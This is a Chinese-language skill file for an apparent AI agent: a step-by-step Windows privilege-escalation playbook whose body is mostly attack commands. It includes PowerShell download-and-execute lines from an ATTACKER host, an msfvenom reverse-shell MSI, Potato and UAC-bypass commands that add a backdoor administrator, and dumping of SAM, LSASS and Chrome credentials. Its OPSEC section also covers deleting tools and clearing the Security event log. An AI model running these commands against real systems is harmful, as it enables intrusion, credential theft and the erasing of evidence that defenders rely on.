---
name: windows-privesc
description: Windows 提权全链路：信息枚举、SeImpersonate 与 Potato 家族、服务配置缺陷、AlwaysInstallElevated、UAC bypass、SAM/LSASS/DPAPI 凭据、计划任务与驱动漏洞
whenToUse: 已拿到 Windows 低权 shell（Web RCE / 弱口令 / 钓鱼上线），需要 SYSTEM 或 Administrator
role: internal
enabled: true
---

# Windows 提权

## 一、枚举（先看特权，再选打法）

```cmd
whoami /all                     :: 用户、组、特权、完整性级别
systeminfo | findstr /B /C:"OS Name" /C:"OS Version" /C:"System Type"
wmic qfe get HotFixID,InstalledOn    :: 补丁号决定能打哪些 CVE
hostname & ipconfig /all & route print
net user & net localgroup administrators
```

PowerShell 一行拉全量：

```powershell
IEX (New-Object Net.WebClient).DownloadString('http://ATTACKER/PowerUp.ps1'); Invoke-AllChecks
```

**关键判定：`whoami /priv` 里有没有这些**（有 = 直接 SYSTEM，不用打内核）：

| 特权 | 利用方式 |
|---|---|
| `SeImpersonatePrivilege` | Potato 家族（服务账户/IIS/MSSQL 默认有） |
| `SeAssignPrimaryTokenPrivilege` | 同上，可 CreateProcessAsUser |
| `SeBackupPrivilege` | 直接读 SAM/SYSTEM，`robocopy /b` |
| `SeRestorePrivilege` | 覆写任意文件（含 system32） |
| `SeTakeOwnershipPrivilege` | 夺所有权后改 ACL |
| `SeDebugPrivilege` | 注入 lsass 或任意进程 |
| `SeLoadDriverPrivilege` | 加载恶意驱动 |

## 二、SeImpersonate → Potato 家族

按目标版本选工具，别一股脑全试：

| 工具 | 适用 | 备注 |
|---|---|---|
| PrintSpoofer | Win10/2016/2019，有 Spooler | 最稳，无需中间人 |
| GodPotato | 2012–2022 全系 | 兼容性最好，首选 |
| SweetPotato | 综合封装 | 内置多方案 |
| RoguePotato | 2019+ 需 OXID 解析 | 要攻击者机器起 socat |
| JuicyPotato | ≤ 2016 | 新版 CLSID 已失效 |

```cmd
:: GodPotato（首选）
GodPotato.exe -cmd "cmd /c whoami"          :: 先验证
GodPotato.exe -cmd "cmd /c net user back P@ss123 /add && net localgroup administrators back /add"

:: PrintSpoofer
PrintSpoofer.exe -i -c cmd                  :: 交互式 SYSTEM

:: RoguePotato（需要攻击者侧）
:: 攻击者: socat tcp-listen:135,reuseaddr,fork tcp:TARGET:135
RoguePotato.exe -r ATTACKER_IP -e "cmd /c whoami" -l 9999
```

## 三、服务配置缺陷（无需特权，只要 ACL 松）

```cmd
:: 找可写的服务二进制路径
accesschk.exe -uwcqv "Everyone" * /accepteula
accesschk.exe -uwcqv "Authenticated Users" *
:: 未加引号的服务路径
wmic service get name,displayname,pathname,startmode | findstr /i "Auto" | findstr /i /v "C:\Windows"
```

三类打法：

```cmd
:: 1. 服务二进制可写 → 直接替换（先备份）
copy /y C:\Windows\Temp\evil.exe "C:\Program Files\Vuln\svc.exe"
sc stop VulnSvc & sc start VulnSvc

:: 2. 未加引号路径 → 在空格断点放同名 exe
:: "C:\Program Files\Vuln App\svc.exe" → 放 C:\Program.exe

:: 3. 服务 ACL 可改 → 改 binPath
sc config VulnSvc binPath= "cmd /c net localgroup administrators back /add"
sc stop VulnSvc & sc start VulnSvc
```

DLL 劫持：用 Process Monitor 过滤 `Result=NAME NOT FOUND` + `Path ends with .dll`，找可写目录下的缺失 DLL。

## 四、AlwaysInstallElevated

```cmd
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
:: 两个都是 0x1 才成立
msiexec /q /i C:\Windows\Temp\evil.msi
```

生成 msi：

```bash
msfvenom -p windows/x64/shell_reverse_tcp LHOST=ATTACKER LPORT=4444 -f msi -o evil.msi
```

## 五、UAC Bypass（管理员组但中完整性）

```cmd
:: fodhelper（Win10 常用）
reg add HKCU\Software\Classes\ms-settings\Shell\Open\command /v DelegateExecute /t REG_SZ /d "" /f
reg add HKCU\Software\Classes\ms-settings\Shell\Open\command /d "cmd /c start C:\Windows\Temp\evil.exe" /f
fodhelper.exe
:: computerdefaults / sdclt / eventvwr 同类
```

PowerShell 一键：

```powershell
IEX (New-Object Net.WebClient).DownloadString('http://ATTACKER/UACME.ps1')
Bypass-UAC -Technique fodhelper -Command "C:\Windows\Temp\evil.exe"
```

## 六、凭据提取

```cmd
:: 1. SeBackupPrivilege 读 SAM（不触发 AV）
reg save HKLM\SAM C:\Windows\Temp\sam.hiv
reg save HKLM\SYSTEM C:\Windows\Temp\sys.hiv
:: 本地离线解
secretsdump.py -sam sam.hiv -system sys.hiv LOCAL

:: 2. LSASS dump（需 SeDebug 或管理员）
procdump.exe -accepteula -ma lsass.exe C:\Windows\Temp\lsass.dmp
:: 或 comsvcs.dll 迷你 dump（免工具）
rundll32.exe C:\Windows\System32\comsvcs.dll, MiniDump (Get-Process lsass).Id C:\Windows\Temp\l.dmp full

:: 3. DPAPI（浏览器/凭据管理器）
mimikatz # dpapi::chrome /in:"%LOCALAPPDATA%\Google\Chrome\User Data\Default\Login Data" /unprotect
:: 或用 SharpDPAPI / DonPAPI 批量

:: 4. 注册表里的明文
reg query HKLM\SOFTWARE\Microsoft\Windows NT\Currentversion\Winlogon
reg query "HKCU\Software\ORL\WinVNC3\Password"
findstr /si password *.xml *.ini *.txt *.config
```

## 七、计划任务与启动项

```cmd
schtasks /query /fo LIST /v | findstr /i "TaskName Run As User Task To Run"
:: 可写脚本被高权任务调用 → 直接改内容

wmic startup get caption,command
reg query HKLM\Software\Microsoft\Windows\CurrentVersion\Run
```

## 八、内核 / 驱动

按 `systeminfo` 补丁号比对，常见：

| CVE | 目标 | 备注 |
|---|---|---|
| CVE-2021-1732 | Win10 20H2 前 | win32k 提权，稳定 |
| CVE-2021-36934 HiveNightmare | Win10 1809+ | 直接读 SAM（ACL 缺陷） |
| CVE-2022-21882 | Win10/11 | win32k，PoC 公开 |
| CVE-2023-36874 | 2019/2022 | 伪造 WER 目录 |

HiveNightmare 最快：

```cmd
icacls C:\Windows\System32\config\SAM
copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\System32\config\SAM C:\Windows\Temp\sam
```

## 九、OPSEC

- 优先 `SeImpersonate` 类（不落地驱动、不触发内核防护）
- 工具用完删；`del /f /q` 后清 `C:\Windows\Temp`
- 避免 `net user /add` 留账户——用已有管理员凭据或加 SSH key
- 事件日志：`wevtutil cl Security`（谨慎，会留 1102）
- 优先改 ACL/配置，而不是装服务

## 十、判定纪律

| 现象 | 判定 |
|---|---|
| `whoami /priv` 有 SeImpersonate | 提权**几乎必成**，先跑 GodPotato 验证 |
| 服务路径可写 | 已成立，实测重启服务后是否 SYSTEM |
| AlwaysInstallElevated 双 0x1 | 已成立 |
| 管理员组 + 中完整性 | 只是 UAC 挡着，bypass 即可，不算提权漏洞 |
| 内核版本撞 CVE | 只是「可能」，必须实跑 |

**只报实测拿到 SYSTEM 的路径。**
